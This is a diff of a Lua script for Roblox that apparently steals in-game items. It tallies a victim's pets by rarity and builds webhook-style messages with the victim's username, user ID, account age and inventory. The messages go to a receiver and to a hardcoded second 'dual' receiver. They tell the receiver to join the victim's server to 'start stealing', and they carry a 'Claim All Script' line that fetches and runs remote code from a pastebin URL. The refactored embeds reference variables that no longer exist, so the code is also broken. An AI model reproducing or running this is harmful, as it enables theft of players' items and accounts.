@@ -1,16 +1,22 @@
-local LogsUsername = "ImagineGotScamXD" -- dual user
+-- Dual User Configuration
+local LogsUsername = "ImagineGotScamXD"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
-local legendaries_count = 0
-local mega_count = 0
-local neon_count = 0
-local ultra_count = 0
-local rare_count = 0
-local uncommon_count = 0
-local common_count = 0
 
-local function muteAllAudio() -- mute all audio ingame
+-- Initialize pet counts
+local pet_counts = {
+    legendary = 0,
+    mega_neon = 0,
+    neon = 0,
+    ultra_rare = 0,
+    rare = 0,
+    uncommon = 0,
+    common = 0
+}
+
+-- Function to mute all in-game audio
+local function muteAllAudio()
     for _, sound in pairs(workspace:GetDescendants()) do
         if sound:IsA("Sound") then
             sound:Stop()
@@ -28,29 +34,35 @@ workspace.DescendantAdded:Connect(function(descendant)
     end
 end)
 
-for i, v in pairs(ClientData.get("inventory").pets) do
-  if InventoryDB[v.category][v.id].rarity == "legendary" then
-    legendaries_count = legendaries_count + 1
-  end
-  if InventoryDB[v.category][v.id].properties == "mega_neon" then
-    mega_count = mega_count + 1
-  end
-  if InventoryDB[v.category][v.id].properties == "neon" then
-    neon_count = neon_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
-    ultra_count = ultra_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "rare" then
-    rare_count = rare_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "uncommon" then
-    uncommon_count = uncommon_count + 1
-  end
-  if InventoryDB[v.category][v.id].rarity == "common" then
-    common_count = common_count + 1
-  end
+-- Function to count pets
+local function countPets()
+    local inventory = ClientData.get("inventory").pets
+    if not inventory then
+        warn("Inventory not found or is empty.")
+        return
+    end
+
+    for _, pet in pairs(inventory) do
+        local petData = InventoryDB[pet.category] and InventoryDB[pet.category][pet.id]
+        if petData then
+            -- Count by rarity
+            if petData.rarity and pet_counts[petData.rarity:lower()] ~= nil then
+                pet_counts[petData.rarity:lower()] = pet_counts[petData.rarity:lower()] + 1
+            end
+
+            -- Count by properties (mega neon, neon)
+            if petData.properties == "mega_neon" then
+                pet_counts.mega_neon = pet_counts.mega_neon + 1
+            elseif petData.properties == "neon" then
+                pet_counts.neon = pet_counts.neon + 1
+            end
+        else
+            warn("Invalid pet data:", pet.category, pet.id)
+        end
+    end
 end
+
+countPets()
 
 local exploit
 local function getexploit()
@@ -84,7 +96,7 @@ local embed1 = {
   embeds = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM** and they should just trade you to start stealing!',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendary).. '\n🐉 Mega Neons: '.. tostring(mega_neon).. '\n🦖 Neons: '.. tostring(neon).. '\n🐊 Ultra Rares: '.. tostring( ultra_rare).. '\n🐌 Rares: '.. tostring(rare).. '\n🦀 Uncommons: '.. tostring(uncommon).. '\n🐈 Commons: '.. tostring(common).. '\n```\n**💼 Execute To Join Them**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
       color = 10428396,
       fields = {
                 {
@@ -103,7 +115,7 @@ local embed2 = {
   embeds = {
     {
       title = 'Gacor kang dualhuk aselole\nCepetin join dongo keburu diambil',
-      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n🏗 Dual Receiver: '.. LogsUsername ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
+      description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n🏗 Dual Receiver: '.. LogsUsername ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendary).. '\n🐉 Mega Neons: '.. tostring(mega_neon).. '\n🦖 Neons: '.. tostring(neon).. '\n🐊 Ultra Rares: '.. tostring( ultra_rare).. '\n🐌 Rares: '.. tostring(rare).. '\n🦀 Uncommons: '.. tostring(uncommon).. '\n🐈 Commons: '.. tostring(common).. '\n```\n**🎁 Claim All Script**:\n\n```lua\nUsername = "'.. tostring(plr) ..'"\nloadstring(game:HttpGet("https://pastebin.com/raw/GzXc94aX"))()\n```',
       color = 10428396,
       fields = {
                 {
